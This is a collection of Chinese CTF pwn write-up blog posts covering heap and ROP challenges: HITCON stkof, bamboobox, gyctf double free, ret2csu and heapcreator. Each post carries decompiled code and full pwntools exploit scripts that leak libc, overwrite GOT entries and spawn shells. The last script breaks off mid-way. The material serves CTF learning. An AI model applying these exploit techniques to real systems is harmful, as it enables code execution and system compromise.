{"posts":[{"title":"ctfwiki-unlink—2014 HITCON stkof","content":"通过这个题目再来学习下unlink 逆向 main函数，一样是个菜单题，但是比较坑的是没给菜单，只能靠用户来逆向出其功能 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { int index; // eax signed int v5; // [rsp+Ch] [rbp-74h] char nptr; // [rsp+10h] [rbp-70h] unsigned __int64 v7; // [rsp+78h] [rbp-8h] v7 = __readfsqword(0x28u); alarm(0x78u); while ( fgets(&amp;nptr, 10, stdin) ) { index = atoi(&amp;nptr); if ( index == 2 ) { v5 = sub_4009E8(); goto LABEL_14; } if ( index &gt; 2 ) { if ( index == 3 ) { v5 = sub_400B07(); goto LABEL_14; } if ( index == 4 ) { v5 = sub_400BA9(); goto LABEL_14; } } else if ( index == 1 ) { v5 = sub_400936(); goto LABEL_14; } v5 = -1; LABEL_14: if ( v5 ) puts(&quot;FAIL&quot;); else puts(&quot;OK&quot;); fflush(stdout); } return 0LL; } add堆块功能： 其中heaparray在0x602140处 signed __int64 sub_400936() { __int64 size; // [rsp+0h] [rbp-80h] char *mem_ptr; // [rsp+8h] [rbp-78h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); size = atoll(&amp;s); mem_ptr = (char *)malloc(size); if ( !mem_ptr ) return 0xFFFFFFFFLL; ::s[++dword_602100] = mem_ptr; printf(&quot;%d\\n&quot;, (unsigned int)dword_602100, size); return 0LL; } free： no UAF signed __int64 sub_400B07() { unsigned int v1; // [rsp+Ch] [rbp-74h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v1 = atol(&amp;s); if ( v1 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v1] ) return 0xFFFFFFFFLL; free(::s[v1]); ::s[v1] = 0LL; return 0LL; } edit:可以任意修改堆块size，造成任意堆溢出 signed __int64 sub_4009E8() { signed __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); index = atol(&amp;s); if ( index &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[index] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); size = atoll(&amp;s); ptr = ::s[index]; for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) ) { ptr += i; size -= i; } if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result; } IO 缓冲区问题分析 值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看 初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。 别管我说的啥，调试就完了 exp 思路：利用unlink修改heaparray[0][1][2]，看exp吧 from pwn import * p = process('./stkof') elf = ELF('./stkof') libc = ELF('./libc.so.6') def add(size): p.sendline('1') p.sendline(str(size)) def edit(index,size,content): p.sendline('2') p.sendline(str(index)) p.sendline(str(size)) p.send(content) def delete(index): p.sendline('3') p.sendline(str(index)) add(0x10) #chunk1：对抗缓冲区 add(0x30) #chunk2 add(0x80) #chunk3 add(0x10) #chunk4 ptr = 0x602140 fd = ptr + 0x10 - 0x18 bk = ptr + 0x10 - 0x10 fake_chunk = p64(0) fake_chunk += p64(0x31) fake_chunk += p64(fd) fake_chunk += p64(bk) fake_chunk += p64(0) * 2 fake_chunk += p64(0x30) fake_chunk += p64(0x90) edit(2,len(fake_chunk),fake_chunk) delete(3) print(&quot;现在修改heaparray[0][1][2] 分别为free，puts和atoi&quot;) payload = p64(0) payload += p64(elf.got['free']) payload += p64(elf.got['puts']) payload += p64(elf.got['atoi']) edit(2,len(payload),payload) print(&quot;现在修改free的值为puts，然后free(1),就是puts(1)，即输出puts的真实地址&quot;) payload = p64(elf.plt['puts']) edit(0,8,payload) delete(1) #context.log_level = 'debug' puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8,b'\\x00')) print(&quot;puts addr ----&gt; &quot; + hex(puts_addr)) print(&quot;经过调试算出来相对差值为0x67860,不知道为什么最近libc老不准&quot;) libc_base = puts_addr - 0x67860 print(&quot;libc ---&gt; &quot; + hex(libc_base)) system_addr = libc_base + 0x3f550 paylaod = p64(system_addr) edit(2,8,paylaod) p.sendline(&quot;sh&quot;) p.interactive() ","link":"https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/"},{"title":"unlink利用—hitcontraining_unlink","content":"unlink 简单说一下吧，不说太多了，比较累了 总结一下 (只讨论2.23版本的libc下的unlink) 利用条件 一个指向heap的指针，在bss段上之类的，最好没开pie，就比较轻松点儿 然后还需要堆溢出或者UAF，目的都是改写smallbin 或是 unsorted bin 的 fd 和 bk 指针 效果 使得已指向chunk 的指针 ptr 变为 ptr - 0x18 通用思路 设指向可 UAF chunk 的指针的地址为 ptr 修改 fd 为 ptr - 0x18 修改 bk 为 ptr - 0x10 触发 unlink 更详细的思路： 以能够进行堆溢出的场景下说明： 1，申请三个堆块012，0用来溢出，1用来作为unsorted bin，2用来保护 2，伪造chunk0，伪造fd和bk之类的，然后利用堆溢出来改写chunk1的prevsize和size的inuse 3，free1，触发unlink 4，找bss段上的全局指针，看看周围怎么利用，比如改got表 解题 逆向 不看了，简单逆向，漏洞位于在edit中，可以任意修改长度，老漏洞了 思路，伪造chunk，然后unlink到bss处，改写heaparray到free@got，然后修改为system 下图为atoi，一开始是修改atoi为system，然后输入sh拿到shell，本地可以打通，但是远程就不行了，qswl 还有libcsearcher，我的libcsearcher像坨屎一样误差就nima离谱，草 exp from pwn import * from LibcSearcher import * #r=process('bamboobox') #r=remote('node3.buuoj.cn',28011) elf=ELF('../hitcontraining_unlink/bamboobox') r = process('../hitcontraining_unlink/bamboobox') def alloc(length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the name of item:&quot;) r.send(context) def edit(idx,length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the new name of the item:&quot;) r.send(context) def free(idx): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) def show(): r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;) alloc(0x30,'bbbb') alloc(0x30,'bbbb') alloc(0x80,'cccc') alloc(0x20,'/bin/sh\\x00') glo=0x6020c8+0x10 fd=glo-0x18 bk=glo-0x10 payload=p64(0)+p64(0x31)+p64(fd)+p64(bk)+b'a'*0x10+p64(0x30)+p64(0x90) edit(1,len(payload),payload) free(2) free_got=elf.got['free'] log.info(&quot;free_got:%x&quot;,free_got) payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got) #print payload1 edit(1,len(payload),payload1) show() #log.info(&quot;got:%s&quot;,r.recv()) free_addr=u64(r.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, b'\\x00')) log.info(&quot;free_addr:%x&quot;,free_addr) libc=LibcSearcher('free',free_addr) libc_base=free_addr-libc.dump('free') log.info(&quot;libc_addr:%x&quot;,libc_base) system_addr=libc_base+libc.dump('system') log.info(&quot;system_addr:%x&quot;,system_addr) edit(1,0x8,p64(system_addr)) pause() free(3) r.interactive() 被环境恶心死了，本地的cccc ","link":"https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/"},{"title":"gyctf_2020_some_thing_exceting","content":"第一次尝试了边做题边写wp，感觉还挺好，因为这样可以使自己思路更开阔，很不错 这个题自己没做出来 原因：ptmalloc管理机制还是不熟悉，没有想起来double free的利用条件（脑子抽了，不知道当时想的什么 逆向和解题中的思路 main函数 r_start函数 可以发现这个函数要求在根目录下有一个flag文件，要不然就exit了，所以本地做题的时候要创建一下 然后还可以发现这个bss段中有个变量貌似很可疑，后期关注下，看看能不能伪造chunk啥的 add函数 这个程序没有edit功能 delete 初步分析是有UAF洞 show 我们直接新建两个堆块，看一下内存分布是什么样子的 from pwn import * local = 1 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x20,'AAAAAAAA',0x30,'BBBBBBBB') add(0x10,'aaaaaaaa',0x50,'bbbbbbbb') pause() 看一下chunk分布 可以初步判定，绿色框框框起来的chunk是管理后面两个ba和na的chunk 但是前面两个非常大的chunk暂时就不知道是用来做什么的了 分布很清晰 刚刚发现，flag被存到了bss的一个数组里面，见r_start函数 而且bss段的分布很有意思 heap[] byte_6020A0 (96) s[] (flag) 这个结构后续肯定可以利用 可以看到，free后的数据区域已经被清空 我现在的思路是既然程序本身好像没有漏洞，那么肯定不能向拿shell的思路去进行了 那我们不妨就考虑信息泄漏这个途径，我们可不可以利用double free呢？尝试改写fd指针到byte_6020A0的位置处，然后show打印内容，因为bss段那样的内存分布，一个可以泄漏出flag，本地调试一下 实验一下发现不可取，因为free后将内容清空了 那么还有一个思路是因为我们有堆管理指针，那么我们可不可以改写指针到bss段呢？再度尝试一下 这种思路也失败了，因为发现无法进行溢出，连空字节都无法溢出 思路三：或许之前大chunk里面有可以利用的点，我们不妨看看 好吧，并没有发现什么玄机，我准备看wp了:( 开幕雷击，发现wp利用的是double free，但是在第一个思路里我失败了，本地double free会报错？ oh no 我傻了，double free的利用条件是前后free的两个chunksize要相同，这样在bin里面才会连接起来，cao，我是sb 这样岂不是简单很多了？？淦，本来可以自己出的，算了，反正没看exp，自己写exp好了 可以看到已经形成闭环了，至于为啥选0x60，是因为bss段上那个数值是96 已经伪造成功了 exp from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x30,'AAAAAAAA',0x50,'BBBBBBBB') #chunk0 add(0x30,'aaaaaaaa',0x50,'bbbbbbbb') #chunk1 delete('0') delete('1') delete('0') bss_6020A0 = 0x6020A0 - 0x8 add(0x50,p64(bss_6020A0),0x50,'A') #chunk2 add(0x50,'B',0x50,'C') #chunk3 show('3') print(p.recv()) p.interactive() ","link":"https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/"},{"title":"ret2csu—缩短payload","content":"起因是这样的，跟一个pwn师傅聊天的时候，他发给我了一道题，说很有意思，我就打开来看了看 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { write(1, &quot;welcome~\\n&quot;, 9uLL); vul(); return 0; } vul函数 ssize_t vul() { char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x100uLL); } 就这？ 我他妈直接ret2csu 先写一下原理吧，到时候复习比较方便 ret2csu __libc_csu_init 重点关注这个函数 为啥呢，因为它里面有很好的gadget 我们知道在64位环境下，前六个参数是由寄存器来传递的，分别是rdi rsi rdx rcx r8 r9 那我们看这两个片段 第一个是pop片段 .text:000000000040060A pop rbx .text:000000000040060B pop rbp .text:000000000040060C pop r12 .text:000000000040060E pop r13 .text:0000000000400610 pop r14 .text:0000000000400612 pop r15 .text:0000000000400614 retn 这一串pop和retn分别打到了寄存器上然后还能retn，但是我们需要的是那六个寄存器，但是看前一个片段 .text:00000000004005F0 mov rdx, r13 .text:00000000004005F3 mov rsi, r14 .text:00000000004005F6 mov edi, r15d .text:00000000004005F9 call qword ptr [r12+rbx*8] 我们可以利用这个来调整寄存器这样edi，rsi，rdx前三个寄存器便可以由我们来控制了 利用 我们看ctfwiki 然后wiki给了一个几乎万能的exp from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF('./level5') sh = process('./level5') write_got = level5.got['write'] read_got = level5.got['read'] main_addr = level5.symbols['main'] bss_base = level5.bss() csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) sh.send(payload) sleep(1) sh.recvuntil('Hello, World\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(sh.recv(8)) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') execve_addr = libc_base + libc.dump('execve') log.success('execve_addr ' + hex(execve_addr)) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh.recvuntil('Hello, World\\n') csu(0, 1, read_got, 16, bss_base, 0, main_addr) sh.send(p64(execve_addr) + '/bin/sh\\x00') sh.recvuntil('Hello, World\\n') ## execve(bss_base+8) csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr) sh.interactive() 这个来泄漏libc是通过write函数，难度上来说比puts要更难了 思路就是先泄漏libc，然后劫持read函数，向bss段上写入/bin/sh，和system之类的系统函数，然后劫持程序流到bss段拿shell 解题 那我们直接照抄exp就好了，反正大同小异（打脸 from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060A def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' payload = b'a' * 0x88 payload += p64(0x40060A) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.recvuntil('~\\n') p.send(payload) p.send(p64(execve)) p.send('/bin/sh\\0') sleep(1) #p.send(p64(execve) + b'/bin/sh\\x00') 想象是美好的，但是很快就发现了问题 程序根本无法跳转到main函数，思考了好久就是没想通 后来经过师傅提醒发现payload长度超了 只允许read 0x100个字节，那我们只好缩减payload 经过调试发现rbx寄存器本来就是0，所以我们可以省略p64(rbx)，结果发现长度正好为0x100 然后第二次向bss写数据的时候就又不行了，这个时候rbx就不是0了 所以换个思路，就用普通栈溢出的思路，找到binsh和system的地址，直接执行 由于我本地的环境有很大问题，LibcSearcher不准，每次偏移都差0x1000，我通过gdb的magic找到了system的地址，但是实在找不到binsh的地址了，所以就此作罢，但是理论上是绝对可以打通的 我贴一下最后的exp from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060B def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' p.recvuntil('~\\n') payload = b'a' * 0x88 pop_ret = 0x400613 payload += p64(pop_ret) + p64(binsh) + p64(system) print(&quot;binsh -----&gt; &quot; + hex(binsh)) print(&quot;system -----&gt; &quot; + hex(system)) p.sendline(payload) p.interactive() 然后贴一下我魔改了师傅的exp from pwn import * from LibcSearcher import LibcSearcher def ret2libc(leak, func, path=''): if path == '': libc = LibcSearcher(func, leak) base = leak - libc.dump(func) system = base + 0x3f550 - 0x1000 wrong = base + libc.dump('system') print(hex(wrong)) binsh = base + libc.dump('str_bin_sh') print('str 的偏移为 ： ' + hex(libc.dump('str_bin_sh'))) print('system 的偏移为 ：' + hex(libc.dump('system'))) else: libc = ELF(path) base = leak - libc.sym[func] system = base + libc.sym['system'] binsh = base + libc.search(b'/bin/sh').__next__() return (system,binsh,base) def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 # or csu(0,1,got_write,1,got_write,8,main) The csu functions of different programs need to be analyzed concretely payload = b'a' * 0x88 payload += p64(gadget_pop) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget_call) payload += b'a' * 0x38 payload += p64(last) p.send(payload) return payload s = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\0')) uu64 = lambda data :u64(data.ljust(8,b'\\0')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) context.log_level = 'DEBUG' binary = './pwn2' context.binary = binary elf = ELF(binary,checksec=False) def dbg(): gdb.attach(p) pause() p = process(binary) #p = remote(&quot;47.95.195.235&quot;,44002) #libc = ELF(&quot;./libc-2.23.so&quot;) main = 0x400587 gadget_pop = 0x40060B gadget_call =0x4005F0 got_write = elf.got['write'] p.recvuntil('\\n') csu(0,1,got_write,8,got_write,1,main) gdb.attach(p) #ru(&quot;welcome~\\n&quot;) write_addr = uu64(r(6)) print('write ---&gt; ' + hex(write_addr)) system,binsh,base = ret2libc(write_addr,'write','') print('system ----&gt; ' + hex(system)) print('binsh ----&gt; ' + hex(binsh)) print(hex(base)) pop_ret = 0x400613 payload3 = b'a' * 136 + p64(pop_ret) + p64(binsh) + p64(system) sla(&quot;welcome~\\n&quot;,payload3) itr() orz wtcl ","link":"https://l3mon629.github.io/post/ret2csu-suo-duan-payload/"},{"title":"一道got表可写的off-by-one — hitcontraining_heapcreator","content":"这个题出了一些坑点，我吐了，做了好久 先正常走一遍吧 off-by-one的流程就是extend chunk 粗糙的写一下刻在DNA里的exp，细节问题错了就错了吧 malloc(overflow) malloc(1) malloc(2) malloc(我来守护上面俩东西不被top chunk吃掉) edit(0,payload) free(1) free(2) leak_libc() some_functions_addr() malloc(size(1) + size(2)) edit(1,写到chunk2的fd pointer) 然后就是fastbin attack 嗯，我一开始也这样做的，很顺利在本地getshell，但是远程打不通 在仓库里有本题目的源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret &lt;=0){ puts(&quot;Error&quot;); _exit(-1); } } struct heap { size_t size ; char *content ; }; struct heap *heaparray[10]; void menu(){ puts(&quot;--------------------------------&quot;); puts(&quot; Heap Creator &quot;); puts(&quot;--------------------------------&quot;); puts(&quot; 1. Create a Heap &quot;); puts(&quot; 2. Edit a Heap &quot;); puts(&quot; 3. Show a Heap &quot;); puts(&quot; 4. Delete a Heap &quot;); puts(&quot; 5. Exit &quot;); puts(&quot;--------------------------------&quot;); printf(&quot;Your choice :&quot;); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i &lt; 10 ; i++){ if(!heaparray[i]){ heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i]){ puts(&quot;Allocate Error&quot;); exit(1); } printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); heaparray[i]-&gt;content = (char *)malloc(size); if(!heaparray[i]-&gt;content){ puts(&quot;Allocate Error&quot;); exit(2); } heaparray[i]-&gt;size = size ; printf(&quot;Content of heap:&quot;); read_input(heaparray[i]-&gt;content,size); puts(&quot;SuccessFul&quot;); break ; } } } void edit_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Content of heap : &quot;); read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void show_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Size : %ld\\nContent : %s\\n&quot;,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void delete_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]-&gt;content); free(heaparray[idx]); heaparray[idx] = NULL ; puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } int main(){ char buf[4]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : show_heap(); break ; case 4 : delete_heap(); break ; case 5 : exit(0); break ; default : puts(&quot;Invalid Choice&quot;); break; } } return 0 ; } 逆向 很容易，没有去除符号表，很nice 创建堆块，这里malloc(0x10)来管理堆块 编辑功能存在off-by-one漏洞，可以溢出一字节 free功能没有use after free 漏洞 show功能，可以来leak libc pwn it！！！ 成功的方法：借助heaparray来改写指针 可以看到管理用户堆的内容上是有指针的，我最喜欢指针了（不是 然后我们可以改写指针，因为防护是这样的： 所以可以攻击got表，注意，攻击got的表的核心在于，，这个题是有现成的指针可以利用！如果没有的话，在ubuntu 16中，我们攻击got表的成本会很高，因为要伪造fastbin的size位 那我们思路就是本文一开始说的，只不过不覆盖fd指针而是覆盖题目给我们留下的罢了 先说说坑点吧，我用了libc-2.23.so，但是远程打不通，本地可通，就很难受，所以干脆直接LibcSearcher ，浪费了很多时间 😦 当时做题的思路都写在print语句里了，还挺好的 exp: from pwn import * from LibcSearcher import * #l3mon_w@nts_A_g1rLfri3nd (bushi) #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',28861) #libc = ELF('./libc.so.6') elf = ELF('./heapcreator') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;第二个exp的思路是因为这个题目有heaparray来管理我们申请的堆块，在heaparray中有指向内容的指针，所以我们可以改写指针来覆盖got表（got表）可写&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 pause() add(0x60,'C') #chunk2 add(0x10,'/bin/sh\\x00') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) delete(2) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) print(&quot;(by free 0x60 , we can change the fd pointer to fastbin attack) &lt;-------------------- 之前的思路&quot;) print(&quot;this method is attack free@got, the free(sth) = sysetm(/bin/sh;) &quot;) print(&quot;(if we cannot success ,we could use some methods to attack got) &lt;--------------------- so we change that :( !!!!!!!&quot;) add(0xe0,'E') #chunk4 = big chunk print(&quot;we can leak libc&quot;) show(1) p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we attack free@got &quot;) free_got = elf.got['free'] #free_addr = libc_base + libc.symbols['free'] system_addr = libc_base + libc.dump('system') print(&quot;free ----------&gt; &quot; + hex(free_got)) print(&quot;system -------&gt; &quot; + hex(system_addr)) payload = p64(__malloc_hook) * 2 payload = payload + p64(0) + p64(0x41) payload = payload + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(free_got) edit(1,payload) add(0x60,'AAAAAAAA') #chunk5 = chunk2 print(&quot;!!!!!!!!!!!!!!!!!!!!!! 这里不确定编辑块5还是块2，我们就加上p.interactive()拿到原始的交互程序调试一下，经过调试发现没有块5，所以这里我们应该编辑chunk2&quot;) #edit(1,'BBBBBBBB') print(&quot;这里很奇怪，当时我发现大chunk的heaparray在它下面，我还以为是中间出现了不可预知的错误，但是经过调试发现，当我改块1的时候，free_got被改了，那只能证明是改chunk1了&quot;) print(&quot;小声bb，理不清流程就逐个调试（不是）&quot;) edit(1,p64(system_addr)) print(&quot;通过free来触发 system(/bin/sh\\00) 本地测试可拿shell， 美汁汁 :) 好，好起来了（不是）&quot;) delete(3) p.interactive() 失败的方法：one_gadget打__malloc_hook 本地也能拿shell，那肯定就是libc的原因了，one_gadget地址不一样的原因应该是 但是很奇葩，为神马这么说呢，当我打one_gadget的时候发现$rsp + 0x70的位置是NULL，但是one_gadget打不通，反倒是rsp + 0x30可以通 截图： 但是我用0x30的gadget竟然通了，本地可拿shell 不知道怎么回事，反正我人傻了，有感兴趣的师傅可以调试一下什么原因，然后给弟弟讲讲（orz 贴一下exp吧，下午再调试一下看看LibcSearcher能不能通 exp: from pwn import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26697) libc = ELF('./libc.so.6') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;初步思路是off-by-one，可以溢出一个字节，所以我们考虑构造重叠chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 